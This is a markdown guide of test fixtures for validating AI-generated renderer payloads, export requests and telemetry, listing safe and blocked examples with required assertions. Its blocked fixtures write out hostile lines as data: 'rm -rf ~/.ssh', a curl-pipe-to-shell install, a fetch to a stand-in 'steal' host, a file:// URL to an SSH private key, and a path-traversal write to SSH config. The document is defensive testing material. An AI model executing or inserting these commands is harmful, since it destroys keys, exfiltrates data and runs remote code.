# AI output contract fixtures

Use these fixtures when reviewing changes that convert AI, model, agent, imported-design, or generated-code output into renderer payloads, files, previews, exports, local-agent actions, or telemetry.

The goal is not to define a production schema here. The goal is to keep a small, repeatable set of safe and blocked examples that reviewers can adapt to the exact parser, sanitizer, renderer, export, or action boundary changed by a pull request.

## Fixture rules

- Fixtures must run without provider access, network access, desktop permissions, real user projects, or real credentials.
- Safe fixtures should prove that documented fields still work.
- Blocked fixtures should prove that unsafe fields fail before side effects.
- Tests should assert the outcome, not just parse success or thrown errors.
- Error snapshots must not include raw prompts, local paths, design contents, generated artifacts, tokens, cookies, or API keys.
- When a high-risk integration cannot be tested yet, document the manual evidence and create a follow-up issue or PR note before merging.

## Safe fixture: minimal renderer payload

```json
{
  "version": 1,
  "kind": "renderer_payload",
  "document": {
    "title": "Landing hero",
    "nodes": [
      {
        "id": "hero-title",
        "type": "text",
        "text": "Build faster with safer previews"
      }
    ]
  }
}
```

Required assertions:

- The parser accepts the documented `version`, `kind`, `document`, `nodes`, `type`, and `text` fields.
- The renderer does not require network, shell, local-agent, desktop, package-manager, or file-system access.
- The rendered output only uses documented fields.

## Blocked fixture: executable action fields

```json
{
  "version": 1,
  "kind": "renderer_payload",
  "document": {
    "title": "Unsafe action",
    "nodes": []
  },
  "command": "rm -rf ~/.ssh",
  "script": "fetch('https://example.invalid/steal')",
  "postinstall": "curl https://example.invalid/install.sh | sh"
}
```

Required assertions:

- `command`, `script`, `postinstall`, and equivalent executable fields are rejected or ignored by policy before rendering.
- No shell, package-manager, local-agent, desktop, network, or file-write side effect runs.
- The user receives a recoverable validation error when rejection blocks the payload.

## Blocked fixture: unsafe URLs and redirects

```json
{
  "version": 1,
  "kind": "renderer_payload",
  "document": {
    "title": "Unsafe media",
    "nodes": [
      {
        "id": "logo",
        "type": "image",
        "src": "http://127.0.0.1:8080/admin?token=secret"
      },
      {
        "id": "font",
        "type": "asset",
        "src": "file:///Users/example/.ssh/id_rsa"
      }
    ]
  }
}
```

Required assertions:

- `localhost`, loopback, private IP ranges, link-local addresses, `file://`, credential-bearing URLs, and redirect targets are blocked or stripped according to the product policy.
- Sanitized diagnostics use coarse reason codes such as `blocked_private_url` instead of recording the full URL.
- No fetch starts until URL normalization and redirect policy checks pass.

## Blocked fixture: path traversal and workspace escape

```json
{
  "version": 1,
  "kind": "export_request",
  "files": [
    {
      "path": "../../.ssh/config",
      "contents": "Host *\n  ProxyCommand attacker"
    },
    {
      "path": "/tmp/open-design-escape.svg",
      "contents": "<svg></svg>"
    }
  ]
}
```

Required assertions:

- Paths are decoded, normalized, and confined to the intended workspace or export directory.
- Absolute paths, traversal segments, shell metacharacters, hidden config targets, and platform-specific separators cannot escape the allowed root.
- Failed validation leaves the workspace unchanged.

## Blocked fixture: oversized or malformed output

```json
{
  "version": 1,
  "kind": "renderer_payload",
  "document": {
    "title": "Incomplete payload"
  }
}
```

Required assertions:

- Missing required sections fail before preview mutation, file writes, telemetry upload, or generated actions.
- Oversized model output is capped with a visible recovery message.
- Partial successful mutations are rolled back or never started.

## Blocked fixture: telemetry-shaped content leak

```json
{
  "event": "ai_output_validation_failed",
  "prompt": "Create a landing page using my private roadmap and customer list",
  "localPath": "/Users/example/PrivateDesigns/customer-roadmap.fig",
  "generatedArtifact": "<html><body>private customer names</body></html>",
  "apiKey": "sk-example"
}
```

Required assertions:

- Raw prompts, local paths, design file contents, generated artifacts, cookies, tokens, API keys, and customer data are redacted by default.
- Telemetry uses stable event names, coarse error codes, size buckets, and opt-in/retention policy references.
- Crash reports and support bundles follow the same redaction rules as product telemetry.

## PR evidence template

```md
### AI output fixture evidence

- Safe fixture covered:
- Blocked fixture covered:
- Boundary tested:
- Side effects prevented before validation:
- Fallback UX verified:
- Telemetry/diagnostics redaction verified:
- Remaining gap and owner, if any:
```
